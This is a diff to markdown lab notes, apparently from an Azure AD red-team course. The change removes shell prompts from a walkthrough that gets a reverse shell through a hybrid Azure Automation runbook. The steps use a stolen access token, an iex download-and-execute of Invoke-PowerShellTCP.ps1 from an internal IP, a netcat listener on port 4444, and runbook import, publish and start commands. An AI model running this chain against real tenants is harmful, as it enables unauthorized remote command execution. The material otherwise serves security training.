@@ -728,22 +728,22 @@ iex (New-Object Net.Webclient).downloadstring("http://172.16.x.x:82/Invoke-Power
 - Host the ```Invoke-PowerShellTCP.ps1``` by copying it to the ```C:\xampp\htdocs``` and starting Apache using xampp.
 - Run the below command in the PowerShell session where you connected using the access token for Mark. It may take couple of minutes:
 ```
-PS C:\AzAD\Tools> Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
+Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
 ```
 
 - Publish the runbook so that we can use it:
 ```
-PS C:\AzAD\Tools> Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
+Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
 ```
 
 - Start a netcat listener on your student VM. Remember to listen on the port that you specified in the runbook studentx:
 ```
-PS C:\AzAD\Tools> C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
+C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
 ```
 
 Finally, start the runbook: 
 ```
-PS C:\AzAD\Tools> Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
+Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
 ```
 
 On the listener, you should see a connect back and we can execute commands!
